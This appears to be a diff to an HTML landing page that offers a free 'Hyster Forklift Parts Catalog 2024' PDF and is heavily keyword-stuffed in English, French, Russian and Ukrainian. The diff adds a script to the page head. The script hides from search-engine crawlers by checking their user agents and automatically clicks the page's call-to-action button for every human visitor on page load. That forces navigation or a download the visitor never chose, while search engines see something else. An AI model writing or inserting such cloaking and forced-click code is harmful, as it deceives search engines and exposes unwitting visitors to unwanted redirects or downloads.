@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hyster Forklift Parts Catalog 2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download the comprehensive Hyster Forklift Parts Catalog 2024 in PDF format for free. This guide helps technicians, dealers, and owners maintain and order parts.">
     <meta name="keywords" content="Hyster Forklift Parts Catalog 2024, Hyster forklift catalog PDF, Hyster parts catalog 2024, Hyster forklift parts 2024, Hyster forklift parts manual, Hyster forklift parts free download, Hyster forklift parts download, Hyster forklift parts catalog PDF download, Hyster forklift parts catalog 2024 free, Hyster B60ZAC2 parts manual 2024, Hyster BE80ZHD parts manual 2024, Hyster E30XN parts manual 2024, Hyster parts catalog high speed download, Hyster spare parts catalog PDF 2024, Hyster forklift parts catalogue free download, Hyster parts manual PDF free download, Hyster parts manual 2024 PDF, Hyster parts PDF free download, catalogue de pièces de rechange pour chariot élévateur Hyster 2024, catalogue des pièces Hyster 2024 télécharger, каталог запчастей для вилочного погрузчика Hyster 2024, каталог деталей Hyster 2024 скачать, каталог запчастин Hyster 2024, каталог запчастин для навантажувачів Hyster 2024, каталог деталей запасных частей Hyster 2024, каталог запчастей Hyster 2024, каталог запчастей Hyster 2024 бесплатно, Hyster Forklift Parts Catalog 2024 free download, Hyster Forklift Parts Catalog 2024 download, Hyster Forklift Parts Catalog 2024 PDF free, Hyster Forklift Parts Catalog 2024 high speed download">
     <style>
